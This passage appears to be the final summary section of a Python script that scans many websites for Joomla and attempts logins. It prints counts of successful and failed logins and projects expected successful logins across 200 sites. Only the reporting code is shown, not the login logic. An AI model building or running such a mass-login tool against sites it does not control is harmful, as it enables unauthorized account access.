    print(f"\n{Colors.WHITE}{'='*60}{Colors.RESET}")
    print(f"{Colors.GREEN}[SCAN COMPLETE] Finished in {elapsed:.2f} seconds{Colors.RESET}")
    print(f"{Colors.CYAN}[SUMMARY] Total sites processed: {global_stats['total']}{Colors.RESET}")
    print(f"{Colors.YELLOW}[SUMMARY] Joomla sites detected: {global_stats['joomla_found']}{Colors.RESET}")
    print(f"{Colors.GREEN}[SUMMARY] Successful logins: {global_stats['success']}{Colors.RESET}")
    print(f"{Colors.RED}[SUMMARY] Failed logins: {global_stats['failed']}{Colors.RESET}")
    
    if global_stats['joomla_found'] > 0:
        success_rate_joomla = (global_stats['success'] / global_stats['joomla_found'] * 100)
        print(f"\n{Colors.BOLD}[SUMMARY] Success rate on Joomla sites: {success_rate_joomla:.1f}%{Colors.RESET}")
        # Example projection for 200 Joomla sites
        print(f"{Colors.BOLD}[SUMMARY] Expected successful logins from 200 Joomla sites (based on current rate): ~{int(200 * success_rate_joomla / 100)}{Colors.RESET}")
    
    print(f"{Colors.MAGENTA}[SUMMARY] Overall processing speed: {global_stats['total']/elapsed:.1f} sites/second{Colors.RESET}")
    
    if global_stats['file_errors'] > 0:
        print(f"{Colors.RED}[WARNING] Encountered {global_stats['file_errors']} file write errors. Check permissions for {RESULTS_FILE}.{Colors.RESET}")
    if global_stats['exceptions'] > 0:
        print(f"{Colors.RED}[WARNING] Encountered {global_stats['exceptions']} unexpected exceptions during scan. Review logs for details.{Colors.RESET}")
        
    print(f"{Colors.WHITE}{'='*60}{Colors.RESET}")

if __name__ == '__main__':
    main()
